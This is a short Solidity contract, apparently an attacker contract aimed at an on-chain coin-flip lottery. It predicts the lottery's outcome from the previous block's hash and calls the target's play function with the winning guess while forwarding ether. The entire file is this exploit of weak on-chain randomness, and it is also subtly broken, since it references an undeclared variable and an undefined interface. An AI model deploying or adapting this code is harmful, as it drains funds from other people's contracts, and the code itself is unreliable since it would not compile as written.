pragma solidity ^0.4.21;

contract Lottery {
    function gogo(bool _heads) internal view returns (bool) {
        bytes32 entropy = blockhash(block.number-1);
        bytes1 coinFlip = entropy[0] & 1;
        if ((coinFlip == 1 && _heads) || (coinFlip == 0 && !_heads)) {
            return true;
        }
        else{
            return false;
        }
    }
    

    address _addr;
    
    function _set (address addr) public{
        _name = LotteryInterface(addr);
        _addr = addr;
    }
    
    function _callLottery (uint32 _gas) public payable { 
       // _name.play.value(msg.value).gas(_gas)(gogo(true));
       bool _truth = gogo(true);
        _addr.call.value(msg.value).gas(_gas)(bytes4(sha3("play(bool)")),_truth);
    }
    
    
    
}
